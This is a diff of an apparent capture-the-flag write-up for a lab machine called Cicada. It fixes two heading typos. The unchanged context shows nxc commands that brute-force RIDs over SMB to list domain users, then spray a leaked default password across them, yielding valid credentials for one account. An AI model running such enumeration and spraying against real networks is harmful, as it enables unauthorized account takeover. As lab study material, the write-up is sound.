@@ -86,7 +86,7 @@ Best regards,
 Cicada Corp
 ```
 
-## Getting Username RID Bruteforce
+## Getting Username via RID Bruteforce
 RID brute-forcing was employed to enumerate valid usernames on the domain. This technique helped identify several user accounts, which were later used in credential spraying attempts.
 ```shell
 $ nxc smb 10.10.11.35 -u 'x' -p '' --rid-brute | grep SidTypeUser                                                                                          
@@ -116,7 +116,7 @@ david.orelious
 emily.oscars
 ```
 
-## SMB Password sparying using `users.txt` and `Cicada$M6Corpb*@Lp#nZp!8`
+## SMB Password spraying using `users.txt` and `Cicada$M6Corpb*@Lp#nZp!8`
 Using the extracted usernames and the default password, a password-spraying attack was conducted. This resulted in identifying valid credentials for the michael.wrightson account.
 ```shell
 $ nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'                                                                                           
